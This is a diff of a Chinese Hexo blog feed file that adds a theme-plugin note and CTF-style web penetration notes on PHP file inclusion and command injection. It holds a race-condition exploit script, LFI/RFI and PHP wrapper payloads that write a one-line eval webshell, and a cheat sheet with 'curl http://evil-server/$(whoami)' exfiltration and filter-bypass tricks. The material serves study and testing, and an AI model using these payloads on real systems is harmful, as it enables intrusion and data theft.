@@ -208,6 +208,18 @@
 <p>在根目录sources文件夹下会生成categories、tags、about、resources四个文件，每个文件中有一个<code>index.md</code>文件，修改内容分别如下：</p>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#例子</span></span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-06-29 11:35:42   # 时间随意</span><br><span class="line">type: &quot;tags&quot;                # 类型一定要为tags</span><br><span class="line">comments: false             # 提示这个页面不需要加载评论</span><br></pre></td></tr></table></figure>
 
+
+
+<h1 id="主题配置优化"><a href="#主题配置优化" class="headerlink" title="主题配置优化"></a>主题配置优化</h1><p>我选butterfly的主题，所以主题是针对这个主题的，不一定适用其他主题</p>
+<h2 id="butterfly主题文章双栏布局插件"><a href="#butterfly主题文章双栏布局插件" class="headerlink" title="butterfly主题文章双栏布局插件"></a>butterfly主题文章双栏布局插件</h2><p><strong>NPM 插件安装的部署方法：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-double-row --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">cnpm i hexo-butterfly-article-double-row --save</span><br></pre></td></tr></table></figure>
+
+<p>注意，一定要加<code>--save</code>，不然本地预览的时候可能不会显示！！！</p>
+<p><strong>新增配置</strong></p>
+<p>是网站根目录下的配置文件_config</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>然后素质三连。</p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -267,6 +279,7 @@
 <li>当被包含的文件在服务器本地时，称为本地文件包含。</li>
 <li>当被包含的文件在第三方服务器时，称为远程文件包含。</li>
 </ul>
+<hr>
 <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于开发人员没对文件名设置严格的规则，和其服务器上的没有过滤掉这些恶意文件，导致带有恶意代码的文件进入被包含进服务器中，从而形成了文件包含漏洞。</p>
 <h2 id="PHP中引发漏洞的函数"><a href="#PHP中引发漏洞的函数" class="headerlink" title="PHP中引发漏洞的函数"></a>PHP中引发漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 表达式包含并运行指定文件</span><br><span class="line"><span class="keyword">include_once</span>(): 表达式包含并运行指定重复运行的文件</span><br><span class="line"><span class="keyword">require</span>():</span><br><span class="line"><span class="keyword">require_once</span>(): PHP会检查该文件是否已经被包含过，如果是则不会再次包含</span><br></pre></td></tr></table></figure>
 
@@ -388,8 +401,7 @@
 <p><strong>漏洞利用脚本</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start() </span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
 
-<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><p><strong>%00截断</strong></p>
-<p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h4><p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
 <p>漏洞代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -397,6 +409,174 @@
 <p><strong>Exp：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
 
+<h4 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a><strong>长度绕过</strong></h4><p>前提：在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line"></span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Exp:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a><strong>点号截断</strong></h4><p><strong>Exp:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a><strong>特殊符号</strong></h4><p>利用特色符号进行绕过，例如 ?、#、*、%20（空格）等</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt?</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>服务器的PHP配置文件中allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件。如果没有对远程文件进行严格的过滤，从而执行恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line"></span><br><span class="line">allow_url_include = On（是否允许include/require远程文件）</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=http://192.168.91.133/FI/test.php%20</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="PHP伪协议文件包含"><a href="#PHP伪协议文件包含" class="headerlink" title="PHP伪协议文件包含"></a>PHP伪协议文件包含</h1><p>PHP是门强大的语言，所以PHP里面有许多已经封装好的协议，类似于库函数，是可以直接调用的，由于没有进行严格过滤，入侵者就可以利用这些协议完成恶意操作。可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
+<h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>这是一个访问本地文件的协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 </span><br><span class="line">这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， </span><br><span class="line">在数据流内容读取之前没有机会应用其他过滤器。</span><br><span class="line"></span><br><span class="line">php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p><strong>漏洞代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://input 是个可以访问请求的原始数据的只读流。 </span><br><span class="line">enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。</span><br></pre></td></tr></table></figure>
+
+<p>用法：?file=php://input 数据利用POST传过去。</p>
+<ul>
+<li><strong>读取POST数据</strong></li>
+</ul>
+<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>写入木马</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
+<p>就是你POST过去的PHP代码会被执行</p>
+<p><strong>恶意代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它会生成一个shell.php的一句话木马文件</p>
+<ul>
+<li><strong>命令执行</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
+<p><strong>恶意代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>读取本地文件中的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$filename = $_GET[&#x27;filename&#x27;]</span><br><span class="line">	include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=file:///var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>data:数据流封装器。一般遇到 <strong>file_get_contents()</strong> 可以来用</p>
+<p>用法：<code>data://text/plain;base64,</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 打印 &quot;I love PHP&quot;</span><br><span class="line">echo file_get_contents(&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意：<code>&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;</code>闭合;</p>
+<p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>恶意代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>这是 php 中用来解压打包文件的，不管后缀是什么。</p>
+<p>用法：?file=phar: //压缩包/内部文件 phar://xxx.png/shell.php</p>
+<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。</p>
+<p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=phar://shell.png/shell.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p>zip 伪协议和 phar 协议类似，但是用法不一样。</p>
+<p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。</p>
+<p>前提： <strong>PHP &gt; =5.3.0</strong></p>
+<p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行漏洞</title>
+    <url>/posts/a43e8dc0.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<p>Linux下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+<p>liunx绕开空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+
